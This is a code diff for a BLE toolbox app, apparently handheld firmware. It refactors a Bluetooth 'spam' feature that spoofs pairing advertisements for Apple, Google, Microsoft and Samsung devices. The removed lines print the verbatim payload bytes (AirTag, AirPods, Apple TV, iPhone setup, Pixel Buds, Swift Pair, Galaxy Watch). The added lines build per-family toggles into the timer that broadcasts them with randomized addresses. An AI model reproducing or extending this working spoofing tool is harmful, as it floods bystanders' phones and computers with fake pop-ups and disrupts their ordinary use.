@@ -29,6 +29,8 @@
 #include <string>
 #include <vector>
 
+#include "BleSpamPayloads.h"
+
 namespace tt::app::bletoolbox {
 
 constexpr auto* TAG = "BleToolbox";
@@ -49,85 +51,6 @@ constexpr uint8_t AIRTAG_OF_TYPE = 0x12;
 constexpr uint32_t POLL_INTERVAL_MS = 300;
 constexpr uint32_t SPAM_INTERVAL_MS = 200;
 constexpr size_t MAX_SCAN_RESULTS = 64;
-
-// One BLE spam advertisement payload (full AD structure bytes), verbatim to ble_gap_adv_set_data().
-struct SpamPayload {
-    const char* label;
-    const uint8_t* data;
-    size_t length;
-};
-
-// ---- Spam payloads (AppleJuice / Momentum ble_spam data) ----
-
-// AirTag: offline-finding manufacturer record (company 0x004C, type 0x12, status + key + hint).
-static const uint8_t kAirtag[] = {
-    0x1e, 0xff, 0x4c, 0x00, 0x12, 0x19, 0x01,
-    // 22-byte public key (zeros) + key bits + hint
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00,
-    0x00, 0x00,
-};
-
-static const uint8_t kAirpods[] = {
-    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
-    0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-};
-
-static const uint8_t kAirpodsPro[] = {
-    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
-    0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-};
-
-static const uint8_t kAppleTvPair[] = {
-    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc0, 0x06, 0x60, 0x4c,
-    0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
-};
-
-static const uint8_t kAppleWatch[] = {
-    0x0a, 0xff, 0x4c, 0x00, 0x0f, 0x05, 0xc0, 0x05, 0x00, 0x00, 0x00,
-};
-
-static const uint8_t kSetupNewIphone[] = {
-    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc0, 0x09, 0x60, 0x4c,
-    0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
-};
-
-static const uint8_t kHomePodSetup[] = {
-    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc0, 0x0b, 0x60, 0x4c,
-    0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
-};
-
-static const uint8_t kPixelBuds[] = {
-    0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c, 0xfe, 0x92, 0xbb, 0xbd, 0x02, 0x0a, 0x00,
-};
-
-static const uint8_t kPixelBudsPro[] = {
-    0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c, 0xfe, 0x9a, 0xdb, 0x11, 0x02, 0x0a, 0x00,
-};
-
-static const uint8_t kSwiftPairCore[] = {
-    0x06, 0xff, 0x06, 0x00, 0x03, 0x00, 0x80,
-};
-
-static const uint8_t kGalaxyWatch[] = {
-    0x0e, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xff, 0x00, 0x00, 0x43, 0x1a,
-};
-
-const SpamPayload kSpamPayloads[] = {
-    { "AirTag",          kAirtag,         sizeof(kAirtag)         },
-    { "AirPods",         kAirpods,        sizeof(kAirpods)        },
-    { "AirPods Pro",     kAirpodsPro,     sizeof(kAirpodsPro)     },
-    { "Apple TV Pair",   kAppleTvPair,    sizeof(kAppleTvPair)    },
-    { "Apple Watch",     kAppleWatch,     sizeof(kAppleWatch)     },
-    { "iPhone Setup",    kSetupNewIphone, sizeof(kSetupNewIphone) },
-    { "HomePod Setup",   kHomePodSetup,   sizeof(kHomePodSetup)   },
-    { "Pixel Buds",      kPixelBuds,      sizeof(kPixelBuds)      },
-    { "Pixel Buds Pro",  kPixelBudsPro,   sizeof(kPixelBudsPro)   },
-    { "Swift Pair",      kSwiftPairCore,  sizeof(kSwiftPairCore)  },
-    { "Galaxy Watch",    kGalaxyWatch,    sizeof(kGalaxyWatch)    },
-};
-constexpr size_t kSpamPayloadCount = sizeof(kSpamPayloads) / sizeof(kSpamPayloads[0]);
 
 // A device discovered during scan/monitor. `manuf` carries the advertisement manufacturer bytes.
 struct Peer {
@@ -153,6 +76,9 @@ struct Context {
     bool spamRunning = false;
     size_t currentPayload = 0;
     bool randomizeAddress = true;
+    // Which spoof families are on (Apple, Android, Windows, Samsung). All on by default. Written
+    // by the LVGL task (family switch handler), read by the spam timer task - benign one-tick race.
+    bool enabled[kFamilyCount] = { true, true, true, true };
 
     std::vector<Peer> scanPeers;
     std::vector<Peer> airtagPeers;
@@ -321,10 +247,26 @@ static void onBtEvent(Context* ctx, const BtEvent& event) {
 static void onSpamTick(Context* ctx) {
     if (!ctx->spamRunning) return;
     if (bluetooth::getRadioState() != bluetooth::RadioState::On) return;
-    if (kSpamPayloadCount == 0) return;
-    ctx->currentPayload = (ctx->currentPayload + 1) % kSpamPayloadCount;
-    const SpamPayload& payload = kSpamPayloads[ctx->currentPayload];
-    bluetooth::startAdvertising(payload.data, payload.length, false, ctx->randomizeAddress);
+    if (kPayloadCount == 0) return;
+    // Advance to the next enabled payload, wrapping around. The radio comes on asynchronously after
+    // ensureBluetoothOn() requests it, so this also no-ops until the radio is actually on.
+    for (size_t i = 0; i < kPayloadCount; i++) {
+        ctx->currentPayload = (ctx->currentPayload + 1) % kPayloadCount;
+        const Payload& payload = kPayloads[ctx->currentPayload];
+        if (ctx->enabled[payload.family]) {
+            bluetooth::startAdvertising(payload.data, payload.length, false, ctx->randomizeAddress);
+            return;
+        }
+    }
+}
+
+static void onFamilySwitchChanged(lv_event_t* event) {
+    auto* sw = static_cast<lv_obj_t*>(lv_event_get_target(event));
+    auto* ctx = static_cast<Context*>(lv_event_get_user_data(event));
+    uintptr_t family = reinterpret_cast<uintptr_t>(lv_obj_get_user_data(sw));
+    if (family < kFamilyCount) {
+        ctx->enabled[family] = lv_obj_has_state(sw, LV_STATE_CHECKED);
+    }
 }
 
 // ---- UI screens ----
@@ -488,7 +430,23 @@ static void showSpamScreen(Context* ctx) {
     auto* label = lv_label_create(ctx->body);
     lv_label_set_text(label, "Spoofs BLE advertisements.");
     ctx->spamLabel = lv_label_create(ctx->body);
-    lv_label_set_text(ctx->spamLabel, kSpamPayloads[ctx->currentPayload].label);
+    lv_label_set_text(ctx->spamLabel, kPayloads[ctx->currentPayload].label);
+
+    // Per-family enable toggles (Apple / Android / Windows / Samsung).
+    for (size_t i = 0; i < kFamilyCount; i++) {
+        auto* btn = lv_button_create(ctx->body);
+        lv_obj_set_width(btn, LV_PCT(100));
+        auto* btnLabel = lv_label_create(btn);
+        lv_label_set_text(btnLabel, kFamilies[i].label);
+        lv_obj_center(btnLabel);
+        auto* sw = lv_switch_create(btn);
+        lv_obj_align(sw, LV_ALIGN_RIGHT_MID, -8, 0);
+        lv_obj_set_user_data(sw, reinterpret_cast<void*>(static_cast<uintptr_t>(i)));
+        lv_obj_add_event_cb(sw, onFamilySwitchChanged, LV_EVENT_VALUE_CHANGED, ctx);
+        if (ctx->enabled[i]) {
+            lv_obj_add_state(sw, LV_STATE_CHECKED);
+        }
+    }
 
     // Randomize address toggle.
     auto* btn = lv_button_create(ctx->body);
@@ -602,7 +560,7 @@ static void onPollTick(Context* ctx) {
         lv_label_set_text(ctx->countLabel, std::format("{} devices", (unsigned)ctx->scanPeers.size()).c_str());
     }
     if (ctx->screen == Screen::Spam && ctx->spamLabel != nullptr) {
-        lv_label_set_text(ctx->spamLabel, kSpamPayloads[ctx->currentPayload].label);
+        lv_label_set_text(ctx->spamLabel, kPayloads[ctx->currentPayload].label);
     }
     lvgl_unlock();
 }
